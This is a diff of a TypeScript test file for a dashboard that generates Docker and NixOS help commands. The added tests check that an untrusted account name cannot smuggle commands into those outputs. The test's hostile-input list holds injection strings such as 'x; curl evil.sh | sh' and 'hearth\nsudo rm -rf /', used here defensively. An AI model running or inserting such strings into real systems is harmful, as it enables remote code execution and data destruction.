@@ -4,6 +4,7 @@ import { categoryOf, countServices, shownCounts } from "./counts";
 import {
   imageLabel,
   loopBand,
+  PORTS_WIDTH,
   portLabel,
   rowLabel,
   shortAge,
@@ -12,7 +13,7 @@ import {
 } from "./format";
 import { familyOf, helpFor } from "./help";
 import { anchoredScroll, indexAt, offsetsOf, windowOf } from "./layout";
-import { type ServerServices, sameEngineView, show } from "./view";
+import { type ServerServices, show } from "./view";
 
 const NOW = Date.parse("2026-10-13T12:00:00Z");
 
@@ -175,6 +176,92 @@ describe("aide par distribution (BR-ENGINE-005, 007, 008, 017)", () => {
     });
   });
 
+  describe("le nom du compte venu de l'agent n'entre dans une commande qu'après validation (I2)", () => {
+    const HOSTILE = [
+      "x; curl evil.sh | sh",
+      "hearth && reboot",
+      "hearth user",
+      "$(id)",
+      "`id`",
+      "hearth\nsudo rm -rf /",
+      "hearth\r\n",
+      "héarth",
+      "ｈearth",
+      "Hearth",
+      "1hearth",
+      "-hearth",
+      "hearth$",
+      "a".repeat(33),
+      "",
+      "../root",
+      "he'arth",
+      'he"arth',
+      "hearth|id",
+      "hearth>x",
+    ];
+    const blocks = (account: string) => [
+      helpFor("access", engine({ agentAccount: account })),
+      helpFor("access", engine({ agentAccount: account }, { osId: "nixos", declarative: true })),
+    ];
+
+    it("un nom hostile n'apparaît jamais dans un bloc de commande ni de configuration", () => {
+      for (const account of HOSTILE) {
+        for (const help of blocks(account)) {
+          if (help.kind === "docs") throw new Error("une aide est attendue");
+          if (account !== "") expect(help.text, JSON.stringify(account)).not.toContain(account);
+          // L'emplacement littéral à remplir, et le dire.
+          expect(help.text).toContain("<compte-de-l-agent>");
+          expect(help.note).toContain("<compte-de-l-agent>");
+          // Jamais de retour à la ligne dans une commande (une seconde commande cachée).
+          if (help.kind === "command") expect(help.text).not.toMatch(/[\r\n]/);
+        }
+      }
+    });
+
+    it("un nom POSIX valide est repris tel quel, sans note", () => {
+      for (const account of ["hearth", "_hearth", "hearth-agent", "svc_1", "a", "a".repeat(32)]) {
+        const [command, config] = blocks(account);
+        expect(command).toMatchObject({
+          kind: "command",
+          text: `sudo usermod -aG docker ${account}`,
+        });
+        expect(config).toMatchObject({
+          kind: "config",
+          text: `users.users.${account}.extraGroups = [ "docker" ];`,
+        });
+        expect(command?.kind === "command" && command.note).toBeFalsy();
+      }
+    });
+
+    it("le nom hostile n'entre dans aucune autre aide (installer, démarrer)", () => {
+      for (const kind of ["install", "start"] as const) {
+        for (const osId of ["debian", "fedora", "arch", "nixos"]) {
+          const help = helpFor(
+            kind,
+            engine({ agentAccount: HOSTILE[0] }, { osId, declarative: osId === "nixos" }),
+          );
+          expect("text" in help ? help.text : "").not.toContain("curl");
+        }
+      }
+    });
+
+    it("la distribution se choisit dans une liste fermée : jamais une valeur reçue", () => {
+      // Des noms qui existent sur tout objet JavaScript ne désignent aucune famille.
+      for (const id of ["constructor", "__proto__", "toString", "hasOwnProperty", "valueOf"]) {
+        expect(
+          familyOf({ osId: id, osLike: [], init: "systemd", declarative: false }),
+          id,
+        ).toBeNull();
+        expect(helpFor("install", engine({}, { osId: id }))).toEqual({ kind: "docs" });
+      }
+      // Une valeur hostile ne choisit rien et n'entre jamais dans la commande de la famille reconnue.
+      const help = helpFor("install", engine({}, { osId: "x; reboot", osLike: ["debian"] }));
+      expect(help).toMatchObject({ kind: "command" });
+      expect("text" in help && help.text).not.toContain("reboot");
+      expect(helpFor("install", engine({}, { osId: "debian; reboot" }))).toEqual({ kind: "docs" });
+    });
+  });
+
   it("aucun texte d'aide ne contient de variable d'environnement ni de secret", () => {
     const all = [
       helpFor("install", engine({}, { osId: "debian" })),
@@ -235,6 +322,12 @@ describe("textes d'une ligne (BR-SVC-002, 006, 022)", () => {
     expect(visiblePortCount([port(80), port(81), port(82)])).toBe(3);
     expect(visiblePortCount(Array.from({ length: 8 }, (_, i) => port(30000 + i)))).toBe(2);
     expect(visiblePortCount([port(65535), port(65534), port(65533), port(65532)])).toBe(2);
+    // Mode compact (colonne de 220 px) : moins de puces tiennent que dans la colonne large de 270 px.
+    expect(visiblePortCount([port(80), port(81), port(82)], PORTS_WIDTH.compact)).toBe(2);
+    expect(visiblePortCount([port(80), port(81), port(82)], PORTS_WIDTH.wide)).toBe(3);
+    // Des ports coupés par l'agent ajoutent la puce « +N », qui prend de la place.
+    expect(visiblePortCount([port(80), port(81)], PORTS_WIDTH.compact, 0)).toBe(2);
+    expect(visiblePortCount([port(80), port(81)], PORTS_WIDTH.compact, 9)).toBe(2);
   });
 
   it("seconde ligne de l'état", () => {
@@ -287,7 +380,13 @@ describe("textes d'une ligne (BR-SVC-002, 006, 022)", () => {
           ],
         }),
       ),
-    ).toBe("web, nginx:1.27, En marche, Créé hors de Hearth, 2 ports");
+    ).toBe(
+      "web, nginx:1.27, En marche, Créé hors de Hearth, 2 ports : 1 vers 1 (TCP), 2 vers 2 (TCP)",
+    );
+    // Un service sur le réseau du serveur le dit, il n'a pas « aucun port » (I1).
+    expect(rowLabel(service({ key: "a", name: "dns", origin: "hearth", hostNetwork: true }))).toBe(
+      "dns, nginx:1.27, En marche, Utilise directement le réseau du serveur : aucun port individuel.",
+    );
     expect(rowLabel(service({ key: "a", name: "db", origin: "hearth", state: "stopped" }))).toBe(
       "db, nginx:1.27, Arrêté",
     );
@@ -436,19 +535,6 @@ describe("ce qui s'affiche (BR-ENGINE-001, 019, BR-SVC-013, 018)", () => {
     });
   });
 
-  it("deux vues identiques du moteur se reconnaissent par l'heure de l'agent, l'état et la liste", () => {
-    const base = engine({ at: NOW, listCurrentAt: NOW - 1000, listDegraded: true });
-    expect(sameEngineView(base, { ...base })).toBe(true);
-    expect(sameEngineView(base, { ...base, at: NOW + 1000 })).toBe(false);
-    expect(sameEngineView(base, { ...base, listDegraded: false })).toBe(false);
-    expect(sameEngineView(base, { ...base, listCurrentAt: NOW })).toBe(false);
-    expect(sameEngineView(base, { ...base, state: "stopped" })).toBe(false);
-    expect(sameEngineView(null, base)).toBe(false);
-    // Agent sans heure : jamais « identique », on ne devine rien.
-    const old = engine();
-    expect(sameEngineView(old, { ...old })).toBe(false);
-  });
-
   it("rien reçu, ou moteur en première détection : le chargement, aucune liste", () => {
     expect(show(undefined)).toEqual({ kind: "loading" });
     expect(show(entry({ engine: engine({ state: "checking" }), services: list }))).toEqual({
@@ -477,6 +563,50 @@ describe("ce qui s'affiche (BR-ENGINE-001, 019, BR-SVC-013, 018)", () => {
       }),
     );
     expect(shown).toMatchObject({ list: { kind: "stale", since: NOW - 40_000 } });
+  });
+
+  describe("âge de la liste d'un moteur non prêt (I3, I4)", () => {
+    const AT = Date.parse("2026-10-13T10:00:00Z");
+    // L'agent a dit la liste à jour il y a 10 s (à SON horloge) quand il a publié « arrêté ».
+    const stopped = (patch: Partial<EngineInfo> = {}) =>
+      engine({ state: "stopped", at: AT, listCurrentAt: AT - 10_000, ...patch });
+
+    it("part de list_current_at, pas du dernier événement : serveur calme, moteur arrêté depuis peu", () => {
+      // Dernier lot prêt reçu il y a 3 h (serveur calme), vue « arrêté » reçue à l'instant.
+      const lastReady = { engineName: "Docker Engine", services: list, at: NOW - 3 * 3_600_000 };
+      expect(
+        show(entry({ engine: stopped(), services: list, lastReady, engineReceivedAt: NOW })),
+      ).toMatchObject({ list: { kind: "stale", since: NOW - 10_000 } });
+    });
+
+    it("le temps écoulé depuis la réception de la vue s'y ajoute (repère de la liaison)", () => {
+      expect(
+        show(entry({ engine: stopped(), services: list, engineReceivedAt: NOW - 60_000 })),
+      ).toMatchObject({ list: { since: NOW - 70_000 } });
+    });
+
+    it("repère de réception inconnu (état relu d'un ancien fichier) : aucune date inventée", () => {
+      expect(
+        show(entry({ engine: stopped(), services: list, engineReceivedAt: null })),
+      ).toMatchObject({ list: { kind: "stale", since: null } });
+    });
+
+    it("agent sans heure : la dernière fois que la liaison a vu le moteur prêt, sinon sa réception de la vue", () => {
+      const lastReady = { engineName: "Docker Engine", services: list, at: NOW - 40_000 };
+      expect(
+        show(entry({ engine: engine({ state: "stopped" }), services: list, lastReady })),
+      ).toMatchObject({ list: { since: NOW - 40_000 } });
+      expect(
+        show(
+          entry({
+            engine: engine({ state: "stopped", lastReadyAt: NOW - 999_000 }),
+            services: list,
+            engineReceivedAt: NOW - 5_000,
+          }),
+        ),
+        // La date « dernière fois prêt » de l'agent n'est jamais comparée à l'horloge de ce poste.
+      ).toMatchObject({ list: { since: NOW - 5_000 } });
+    });
   });
 
   it("moteur non pris en charge : la dernière liste du MÊME moteur seulement", () => {
